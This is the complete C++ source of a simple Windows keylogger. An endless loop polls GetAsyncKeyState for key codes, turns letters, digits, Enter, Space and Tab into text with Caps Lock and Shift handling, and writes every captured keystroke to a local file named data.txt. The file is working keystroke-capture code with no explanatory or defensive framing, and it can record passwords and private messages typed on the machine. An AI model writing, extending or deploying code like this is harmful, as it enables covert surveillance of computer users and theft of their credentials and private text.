#include <iostream>
#include <fstream>
#include <string>
#include <windows.h>

using namespace std;

string storage;

void log(){
    ofstream data("data.txt", ios::trunc);
    if (data.is_open()) {
        data << storage;
    } else {
        cout << "Failed to open file" << endl;
    }
    }

bool handle_CapsLock(){
    return (GetKeyState(VK_CAPITAL) & 0x0001) != 0;
}

bool handle_Shift(){
    return (GetKeyState(VK_SHIFT) & 0x8000) != 0;
}

string key_to_string(int key){
    if(key >= 'A' && key <= 'Z'){
        bool CapsLock = handle_CapsLock();
        bool Shift = handle_Shift();
        if(CapsLock ^ Shift){
            return string(1, char(key));  
        } else {
            return string(1, char(key + 32)); 
        }
    }
    if(key >= '0' && key <= '9'){
        return string(1, char(key));
    }



    switch(key){
        case VK_RETURN: return "\n";
        case VK_SPACE: return " ";
        case VK_TAB: return "\t";
        default: return "";
    }
}

void handle_backspace(){
    if(!storage.empty()){
        storage.pop_back();
    }
    log();
}

int main() {
    while (true) {
        for (int key = 8; key <= 190; key++) {
            if (GetAsyncKeyState(key) & 0x0001) {
               if (key == VK_BACK) {
                    handle_backspace();
                } else {
                    string keyStr = key_to_string(key);
                    if (!keyStr.empty()) {
                        storage += keyStr;
                        log();
                    }
                }
            }
        }
    }
    return 0;
}

